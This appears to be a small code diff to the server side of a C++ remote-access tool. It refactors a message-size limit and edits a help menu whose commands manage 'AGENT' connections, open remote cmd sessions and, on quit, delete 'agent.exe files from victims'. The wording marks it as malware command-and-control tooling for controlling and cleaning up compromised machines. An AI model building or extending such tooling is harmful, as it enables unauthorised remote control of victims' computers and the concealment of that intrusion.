@@ -247,7 +247,7 @@ BOOL Controller::ReceiveData(std::string& szOutBuffer) {
         uiHostMessageLen = ntohl(uiNetMessageLen);
         INT iTotalBytesReceived = 0;
 
-        if (uiHostMessageLen > 20 * 1024 * 1024) {
+        if (uiHostMessageLen > MAX_MSG_SIZE) {
             return FALSE;
         }
 
@@ -386,7 +386,7 @@ BOOL Controller::WriteToChild(HANDLE hChildStdinWrite, const std::string& szData
 VOID Controller::ShowMan()
 {
     std::cout << "[*] AGENT - Can be used as IP:PORT pair or HOSTNAME:SESSION pair.\n";
-    std::cout << "[*] quit - Kill server and all connections.\n";
+    std::cout << "[*] quit - Kill server and all connections, delete agent.exe files from victims.\n";
     std::cout << "[*] close AGENT - Close connection.\n";
     std::cout << "[*] cmd AGENT - Start a cmd session with AGENT.\n";
     std::cout << "[*] list - Show all active connections.\n";
